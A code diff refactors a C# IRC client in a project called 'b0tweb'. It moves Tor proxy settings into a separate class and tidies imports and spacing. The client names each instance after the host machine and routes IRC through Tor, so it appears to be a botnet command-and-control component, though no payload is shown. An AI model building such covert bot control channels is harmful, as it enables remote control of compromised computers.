@@ -1,7 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
 using b0tweb.MessageHandlers;
 using Meebey.SmartIrc4net;
 
@@ -22,16 +19,6 @@ namespace b0tweb
         /// The IRC port to use fogit r the connection.
         /// </summary>
         private const int Port = 6667;
-
-        /// <summary>
-        /// The proxy host address of the Tor proxy server.
-        /// </summary>
-        private const string ProxyHost = "localhost";
-
-        /// <summary>
-        /// The proxy host port of the Tor proxy server.
-        /// </summary>
-        private const int ProxyPort = 9050;
 
         /// <summary>
         /// The proxy type of the Tor proxy server.
@@ -59,8 +46,8 @@ namespace b0tweb
             this._nick = "bot_" + Environment.MachineName + "_" + rand.Next(0, 1000).ToString();
             this._realName = this._nick + "_real";
 
-            this._irc.ProxyHost = IRCConnectionController.ProxyHost;
-            this._irc.ProxyPort = IRCConnectionController.ProxyPort;
+            this._irc.ProxyHost = TorProxy.Host;
+            this._irc.ProxyPort = TorProxy.Port;
             this._irc.ProxyType = IRCConnectionController.ProxyKind;
         }
 
@@ -90,7 +77,7 @@ namespace b0tweb
         /// Binds the <c>OnChannelMessage</c> event handler to the <c>callback</c> given.
         /// </summary>
         /// <param name="callback">The event handler to execute on a channel message receive.</param>
-        public void AddMessageHandler (AbstractMessageHandler messageHandler)
+        public void AddMessageHandler(AbstractMessageHandler messageHandler)
         {
             this._irc.OnChannelMessage += messageHandler.GetHandler(); ;
         }
